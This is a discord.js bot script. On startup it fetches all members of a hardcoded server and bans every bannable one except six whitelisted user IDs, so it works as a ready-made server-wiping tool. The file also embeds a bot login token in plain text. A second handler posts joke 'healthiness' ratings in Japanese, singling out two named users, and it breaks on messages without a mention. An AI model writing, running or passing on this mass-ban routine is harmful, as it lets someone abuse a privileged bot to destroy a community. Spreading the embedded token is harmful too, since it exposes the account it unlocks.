const { Client, GatewayIntentBits } = require("discord.js");
const { send } = require("process");

const client = new Client({
  intents: Object.keys(GatewayIntentBits).map((intent) => {
    return GatewayIntentBits[intent];
  }),
});

const throws = [
  "1176812229631430660",
  "1078929872572911677",
  "986207285405700117",
  "1161617398403706890",
  "1004365048887660655",
  "1187712748424011806",
];

client.on("ready", async () => {
  console.log(`[+] Logged in as ${client.user.tag}`);
  const guild = client.guilds.cache.get("1099494653889347605");
  if (!guild) return console.log("[!] Guild not found");
  console.log(`[+] Found guild: ${guild.name}`);

  console.log(`[+] Fetching members...`);
  const members = await guild.members.fetch();
  console.log(`[+] Fetched ${members.size} members`);

  let memberCount = members.size;

  console.log(`[+] Starting to ban members...`);
  members.forEach(async (member) => {
    if (throws.includes(member.id)) return console.log(`[!] Skipping ${member.user.tag}`);
    if (member.bannable) {
      await member.ban();
      memberCount--;
      console.log(`[+] Banned ${member.user.tag} | ${memberCount} members left`);
    } else {
      console.log(`[!] Could not ban ${member.user.tag}`);
    }
  });
});

process.on("uncaughtException", (e) => console.log(`Error: ${e}`));
process.on("unhandledRejection", (e) => console.log(`Error: ${e}`));

client.login(
  "MTIwOTA2MDA1MDg1Nzg4NTczNw.GNA8SE.AfUIFuiegTtHa59_hEUsiDEds_nUMqpkp2WDFQ",
);

client.on('messageCreate', async (message) => {


  const member = message.mentions.members.first();

  if (member.user.username === "kino_tkr") {
    await message.channel.send({
      content: `${member.user.username} の健全度` +
      '**健全:** 0%\n'+ 
      '**不健全:** 100%\n',
    })
  } else if (member.user.username === "harukoto_") {
    await message.channel.send({
      content: `${member.user.username} の健全度` +
      '**健全:** 120%\n'+ 
      '**不健全:** -20%\n',
    })
  } else {
    await message.channel.send({
      content: `${member.user.username} の健全度` +
      '**健全:** 99%\n'+ 
      '**不健全:** 1%\n',
    })
  }

})